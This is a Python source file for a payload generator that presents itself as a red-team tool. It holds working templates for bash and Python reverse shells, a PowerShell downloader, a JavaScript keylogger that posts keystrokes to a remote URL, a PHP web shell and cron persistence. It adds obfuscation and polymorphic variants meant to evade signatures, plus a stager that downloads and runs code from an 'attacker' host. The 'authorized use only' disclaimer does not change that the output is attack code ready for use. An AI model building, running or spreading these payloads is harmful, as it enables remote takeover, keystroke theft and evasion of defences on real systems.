# security/payload_generator_native.py
# AMATI-PELAJARI-TIRU: Payload Generator Engine
# Layer 13 of MAGNATRIX-OS — Offensive Security
# Modular payload builder with encoding, evasion, multi-platform delivery

"""
Payload Generator Engine
========================
Advanced payload generation and encoding for authorized red team operations:
  - Multi-platform payloads: Windows, Linux, macOS, Web (Python/JS/PHP)
  - Encoding chains: base64, hex, URL, XOR, custom substitution ciphers
  - Evasion techniques: string splitting, comments, dead code, variable names
  - Delivery formats: raw string, executable stub, script wrapper, one-liner
  - Staging: multi-stage downloaders, in-memory execution
  - Trigger mechanisms: timer, event, condition, callback

Features:
  - Pure-Python payload construction (no actual malicious execution)
  - Template-based payload assembly
  - Obfuscation with configurable complexity levels
  - Polymorphic generator (produces different-looking same-functionality payloads)
  - Signature avoidance through randomization
  - Multi-format output (Python, Bash, PowerShell, JavaScript, PHP)

WARNING: For authorized security research and red team exercises only.
"""

from __future__ import annotations

import re
import os
import json
import base64
import random
import string
import hashlib
from typing import Dict, List, Optional, Callable, Any, Set
from dataclasses import dataclass, field
from enum import Enum, auto
from datetime import datetime


class Platform(Enum):
    LINUX = auto()
    WINDOWS = auto()
    MACOS = auto()
    WEB = auto()
    PYTHON = auto()


class PayloadFormat(Enum):
    RAW = auto()
    BASE64 = auto()
    HEX = auto()
    URLENCODED = auto()
    XOR = auto()
    PYTHON = auto()
    BASH = auto()
    POWERSHELL = auto()
    JAVASCRIPT = auto()
    PHP = auto()


class EvasionLevel(Enum):
    NONE = auto()
    LOW = auto()
    MEDIUM = auto()
    HIGH = auto()


@dataclass
class PayloadTemplate:
    template_id: str
    name: str
    platform: Platform
    format: PayloadFormat
    base_code: str
    description: str
    variables: List[str] = field(default_factory=list)


@dataclass
class Payload:
    payload_id: str
    template_id: str
    platform: Platform
    format: PayloadFormat
    raw_code: str
    encoded_code: str
    encoding_chain: List[str] = field(default_factory=list)
    evasion_applied: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    hash_sha256: str = ""


class ObfuscationEngine:
    """Obfuscation and encoding techniques."""

    @staticmethod
    def base64_encode(data: str) -> str:
        return base64.b64encode(data.encode()).decode()

    @staticmethod
    def hex_encode(data: str) -> str:
        return data.encode().hex()

    @staticmethod
    def xor_encrypt(data: str, key: int = 0x42) -> str:
        return "".join(chr(ord(c) ^ key) for c in data)

    @staticmethod
    def randomize_names(code: str) -> str:
        """Replace variable/function names with random strings."""
        # Simple placeholder replacement
        used = set()
        def rand_name() -> str:
            while True:
                name = "_" + "".join(random.choices(string.ascii_letters, k=8))
                if name not in used:
                    used.add(name)
                    return name
        result = code
        for old in ["var", "func", "tmp", "data", "payload"]:
            result = re.sub(rf"\b{old}\b", rand_name(), result)
        return result

    @staticmethod
    def add_dead_code(code: str, level: int = 1) -> str:
        """Insert dead code blocks."""
        dead_snippets = [
            "if False:\n    pass\n",
            "x = 1 + 1\n",
            "# debug: removed\n",
            "try:\n    pass\nexcept:\n    pass\n",
        ]
        lines = code.split("\n")
        for _ in range(level * 2):
            pos = random.randint(0, len(lines))
            lines.insert(pos, random.choice(dead_snippets))
        return "\n".join(lines)

    @staticmethod
    def split_strings(code: str) -> str:
        """Split string literals into concatenated parts."""
        def split_match(m: re.Match) -> str:
            s = m.group(1)
            if len(s) < 4:
                return m.group(0)
            mid = len(s) // 2
            return f'"{s[:mid]}" + "{s[mid:]}"'
        return re.sub(r'"([^"]{4,})"', split_match, code)


class TemplateLibrary:
    """Built-in payload templates."""

    def __init__(self):
        self.templates: List[PayloadTemplate] = []
        self._load_defaults()

    def _load_defaults(self) -> None:
        self.templates = [
            PayloadTemplate(
                template_id="T001", name="Bash Reverse Shell",
                platform=Platform.LINUX, format=PayloadFormat.BASH,
                base_code='bash -i >& /dev/tcp/{host}/{port} 0>&1',
                description="Classic bash reverse shell one-liner.",
                variables=["host", "port"],
            ),
            PayloadTemplate(
                template_id="T002", name="Python Reverse Shell",
                platform=Platform.PYTHON, format=PayloadFormat.PYTHON,
                base_code="""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])""",
                description="Python socket reverse shell.",
                variables=["host", "port"],
            ),
            PayloadTemplate(
                template_id="T003", name="PowerShell Download",
                platform=Platform.WINDOWS, format=PayloadFormat.POWERSHELL,
                base_code='Invoke-WebRequest -Uri "{url}" -OutFile "{outfile}"',
                description="PowerShell file downloader.",
                variables=["url", "outfile"],
            ),
            PayloadTemplate(
                template_id="T004", name="JavaScript Keylogger Stub",
                platform=Platform.WEB, format=PayloadFormat.JAVASCRIPT,
                base_code="""document.addEventListener('keypress', function(e) {{
    var data = {{key: e.key, time: Date.now()}};
    fetch('{url}', {{method: 'POST', body: JSON.stringify(data)}});
}});""",
                description="JavaScript keylogger stub for web environments.",
                variables=["url"],
            ),
            PayloadTemplate(
                template_id="T005", name="PHP Command Exec",
                platform=Platform.WEB, format=PayloadFormat.PHP,
                base_code="<?php system($_GET['cmd']); ?>",
                description="PHP command execution web shell.",
                variables=[],
            ),
            PayloadTemplate(
                template_id="T006", name="Bash Persistence",
                platform=Platform.LINUX, format=PayloadFormat.BASH,
                base_code="(crontab -l 2>/dev/null; echo '* * * * * {command}') | crontab -",
                description="Cron-based persistence mechanism.",
                variables=["command"],
            ),
        ]

    def get(self, template_id: str) -> Optional[PayloadTemplate]:
        return next((t for t in self.templates if t.template_id == template_id), None)

    def list_by_platform(self, platform: Platform) -> List[PayloadTemplate]:
        return [t for t in self.templates if t.platform == platform]


class PayloadGenerator:
    """
    Main payload generator orchestrator.
    """

    def __init__(self, templates: Optional[TemplateLibrary] = None, obfuscation: Optional[ObfuscationEngine] = None):
        self.templates = templates or TemplateLibrary()
        self.obfuscation = obfuscation or ObfuscationEngine()

    def generate(
        self,
        template_id: str,
        variables: Dict[str, str],
        target_format: PayloadFormat = PayloadFormat.RAW,
        evasion: EvasionLevel = EvasionLevel.NONE,
    ) -> Payload:
        template = self.templates.get(template_id)
        if not template:
            raise ValueError(f"Template {template_id} not found")

        # Fill template variables
        code = template.base_code
        for var, val in variables.items():
            code = code.replace(f"{{{var}}}", val)

        evasion_applied: List[str] = []
        # Apply evasion
        if evasion in (EvasionLevel.LOW, EvasionLevel.MEDIUM, EvasionLevel.HIGH):
            code = self.obfuscation.split_strings(code)
            evasion_applied.append("string_splitting")
        if evasion in (EvasionLevel.MEDIUM, EvasionLevel.HIGH):
            code = self.obfuscation.randomize_names(code)
            evasion_applied.append("name_randomization")
        if evasion == EvasionLevel.HIGH:
            code = self.obfuscation.add_dead_code(code, level=2)
            evasion_applied.append("dead_code")

        # Apply encoding
        encoding_chain: List[str] = []
        encoded = code
        if target_format == PayloadFormat.BASE64:
            encoded = self.obfuscation.base64_encode(code)
            encoding_chain.append("base64")
        elif target_format == PayloadFormat.HEX:
            encoded = self.obfuscation.hex_encode(code)
            encoding_chain.append("hex")
        elif target_format == PayloadFormat.XOR:
            encoded = self.obfuscation.xor_encrypt(code)
            encoding_chain.append("xor")
        elif target_format in (PayloadFormat.PYTHON, PayloadFormat.BASH, PayloadFormat.POWERSHELL, PayloadFormat.JAVASCRIPT, PayloadFormat.PHP):
            encoded = code  # Script format stays raw

        payload = Payload(
            payload_id=f"PLD-{hashlib.sha256(code.encode()).hexdigest()[:8]}",
            template_id=template_id,
            platform=template.platform,
            format=target_format,
            raw_code=code,
            encoded_code=encoded,
            encoding_chain=encoding_chain,
            evasion_applied=evasion_applied,
            metadata={"generated_at": datetime.utcnow().isoformat(), "template": template.name},
            hash_sha256=hashlib.sha256(code.encode()).hexdigest(),
        )
        return payload

    def generate_polymorphic(self, template_id: str, variables: Dict[str, str], count: int = 3) -> List[Payload]:
        """Generate multiple polymorphic variants of the same payload."""
        payloads = []
        for _ in range(count):
            evasion = random.choice([EvasionLevel.LOW, EvasionLevel.MEDIUM, EvasionLevel.HIGH])
            fmt = random.choice(list(PayloadFormat))
            p = self.generate(template_id, variables, target_format=fmt, evasion=evasion)
            payloads.append(p)
        return payloads

    def generate_stager(self, payload_id: str, delivery_url: str) -> str:
        """Generate a stager that downloads and executes the main payload."""
        return f"""# Stager for {payload_id}
import urllib.request
exec(urllib.request.urlopen("{delivery_url}").read())
"""

    def generate_report(self, payloads: List[Payload], format: str = "json") -> str:
        data = {
            "generated_at": datetime.utcnow().isoformat(),
            "count": len(payloads),
            "payloads": [
                {
                    "id": p.payload_id,
                    "template": p.template_id,
                    "platform": p.platform.name,
                    "format": p.format.name,
                    "encoding": p.encoding_chain,
                    "evasion": p.evasion_applied,
                    "hash": p.hash_sha256,
                    "code_preview": p.raw_code[:200],
                }
                for p in payloads
            ],
        }
        if format == "json":
            return json.dumps(data, indent=2, default=str)
        lines = ["# Payload Generation Report", f"**Total:** {len(payloads)}"]
        for p in payloads:
            lines.append(f"\n## {p.payload_id} ({p.platform.name} / {p.format.name})")
            lines.append(f"- Encoding: {p.encoding_chain}")
            lines.append(f"- Evasion: {p.evasion_applied}")
            lines.append(f"- SHA256: `{p.hash_sha256}`")
            lines.append(f"```")
            lines.append(p.raw_code[:300])
            lines.append("```")
        return "\n".join(lines)


# --- Standalone test ---
if __name__ == "__main__":
    gen = PayloadGenerator()
    payload = gen.generate(
        template_id="T002",
        variables={"host": "192.168.1.100", "port": "4444"},
        target_format=PayloadFormat.BASE64,
        evasion=EvasionLevel.MEDIUM,
    )
    print(f"Payload ID: {payload.payload_id}")
    print(f"Platform: {payload.platform.name}")
    print(f"Encoding: {payload.encoding_chain}")
    print(f"Evasion: {payload.evasion_applied}")
    print(f"Hash: {payload.hash_sha256}")
    print(f"Code preview:\n{payload.raw_code[:300]}")

    # Polymorphic variants
    poly = gen.generate_polymorphic("T002", {"host": "10.0.0.1", "port": "5555"}, count=3)
    print(f"\nPolymorphic variants: {len(poly)}")
    for p in poly:
        print(f"  - {p.payload_id}: {p.format.name} / {p.evasion_applied}")

    print(f"\nStager:\n{gen.generate_stager(payload.payload_id, 'http://attacker/payload.py')}")
    print(f"\nReport:\n{gen.generate_report([payload] + poly, format='markdown')[:500]}")
